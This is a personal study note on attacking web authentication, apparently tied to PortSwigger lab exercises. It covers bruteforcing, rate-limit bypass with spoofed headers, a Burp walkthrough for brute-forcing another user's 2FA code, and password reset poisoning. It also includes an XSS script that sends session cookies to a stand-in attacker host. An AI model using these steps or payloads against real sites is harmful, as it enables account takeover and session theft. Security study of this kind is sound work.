# Authentication

## Response timing bruteforce

If there is username/password, it could be helpful to send a long password to process more and have a higher delay. 
If username/pass are not the ones being brute forced, then could be on another variable.

Some systems block by IP, could be bypassed if after a successfull login it resets, so can put some legit logins between the failures.

Account Locking, after x tries. If the logic is not good, can stil bruteforce and errors can give enumeration and difference in response can give the password.

Rate limiting: IP could be changed with `X-Forwarded-From`. It also could work if guess multiple passwords with a single request.

## Multi-factor Authentication

SIM swapping could be a problem

### Bypassing 2FA

• Check if can skip to the destination page after puting credentials and before or during 2FA comes

**Example:**

• With Burp running, **log in** to your own account and investigate the 2FA verification process. Notice that in the `POST /login2 request`, the verify parameter is used to determine which user's account is being accessed.`

• **Log out** of your account.

• Send the `GET /login2` request to Burp Repeater. Change the value of the verify parameter to David and send the request. This ensures that a **temporary 2FA code is generated** for David.

• Go to the login page and **enter your username and password**. Then, submit an **invalid 2FA code**.

• Send the `POST /login2` request to Burp Intruder.

• In **Burp Intruder**, set the **verify parameter to David** and add a payload position to the mfa-code parameter. **Brute-force the verification code**.

• **Load the 302 response** in the browser.

• Click My account to solve the lab.

**Note:** 2FA bruteforce prevention. Logging out the user after a number of requests, is ineffective, cause the attacker can automate multi-process. Turbo intruder extension can be used.

## Other auth mechanisms

**Remember me checkbox:** usually done with persistent cookies, needs to be random

If hashes are used, then should be of somehting not found in wordlists

## With XSS could steal “remember me” cookie

Logs cookie in the URL:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<script>
  new Image().src = "https://attacker-server.com/log?c=" + document.cookie;
</script>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## Reset password

On the email should be not the actual password, and if sent should be a temporal one, to be changed fast.

Better a link to reset, but it should be unique not guessable, link should expire fast. Validation could allow to change others passwords.

**Password reset poisoning:** sends link to user email with evil domain. Can be done changing `host header` or `X-Forwarded-Host header`.

`X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`

If there is a function like change password while logged in with the current pass and new pass, maybe brute forcing the pass and setting different new passwords (usually asks to be put twice), will work. Sometimes the attack does not work with the same new passwords, it logs out.
